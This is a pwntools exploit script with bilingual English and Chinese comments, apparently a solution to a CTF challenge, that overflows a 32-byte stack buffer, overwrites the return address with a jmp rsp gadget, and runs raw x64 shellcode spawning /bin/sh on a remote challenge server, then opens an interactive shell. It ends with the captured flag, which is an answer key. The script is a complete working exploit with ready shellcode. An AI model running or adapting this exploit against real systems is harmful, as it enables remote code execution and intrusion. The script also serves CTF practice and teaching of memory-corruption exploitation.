from pwn import *

# 1. Setup Environment / 设置环境
# Set the target architecture to 64-bit Linux
# 设置目标架构为 64 位 Linux
context.arch = 'amd64'
# Enable debug logging to see all data sent and received
# 开启调试日志，可以清晰地看到程序发送和接收的每一个字节
context.log_level = 'debug'

# -------------------------------------------
# 2. Establish Connection / 建立连接
# Replace with the actual IP and Port provided by the CTF platform
# 替换为 CTF 平台提供的实际 IP 和端口
p = remote('svtctf.m0lecon.it', 13460)
# -------------------------------------------

# 3. Key Exploit Data / 关键漏洞数据
# The address of a "jmp rsp" instruction found in the binary. 
# It acts as a springboard to jump back to our shellcode on the stack.
# 在二进制文件中找到的 "jmp rsp" 指令地址。它像一个跳板，跳向栈上执行我们的 Shellcode。
jmp_rsp = 0x40118d  

# Calculation: 0x20 (32 bytes buffer) + 8 bytes (saved RBP) = 40 bytes.
# Any data after these 40 bytes will overwrite the Return Address (RIP).
# 偏移量计算：32字节缓冲区 + 8字节 RBP = 40字节。
# 40字节之后的数据会精准地覆盖函数的“返回地址”。
offset = 40 

# 4. Prepare Shellcode / 准备 Shellcode
# Standard Linux x64 shellcode that executes '/bin/sh' to give us a command prompt.
# 标准的 Linux x64 Shellcode，执行后会弹出 /bin/sh 命令行。
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

# 5. Assemble Payload / 组装攻击载荷
# [ 40 bytes Padding ] -> Fills the buffer and RBP
# [ jmp_rsp Address ]  -> Overwrites the return address (RIP)
# [ Shellcode ]        -> Placed exactly where RSP will point after the function returns
# [ 40字节填充 ]        -> 填满缓冲区并覆盖旧的 RBP
# [ jmp_rsp 地址 ]     -> 覆盖返回地址，使程序跳向 jmp rsp 指令
# [ Shellcode ]        -> 放在返回地址之后，因为 ret 指令执行后，RSP 恰好指向这里
payload = b'A' * offset
payload += p64(jmp_rsp)
payload += shellcode

# 6. Execution / 发送攻击
print(f"[*] Sending payload with offset {offset}...")
# Send the payload followed by a newline character
# 发送 Payload 并在末尾加上换行符
p.sendline(payload)

# 7. Post-Exploit Interaction / 获取 Shell 交互
# Send 'ls' to verify the shell is working
# 发送 'ls' 命令来验证 Shell 是否成功获取
p.sendline(b'ls')
# Switch to interactive mode so the user can type commands directly
# 切换到交互模式，用户可以直接输入命令（如 cat flag）
p.interactive()

# Flag obtained from the challenge / 题目最终拿到的 Flag
# svt{ex3cut4bl3_st4ck_1s_4w3s0m3_8mew9yqXLJIusZkU}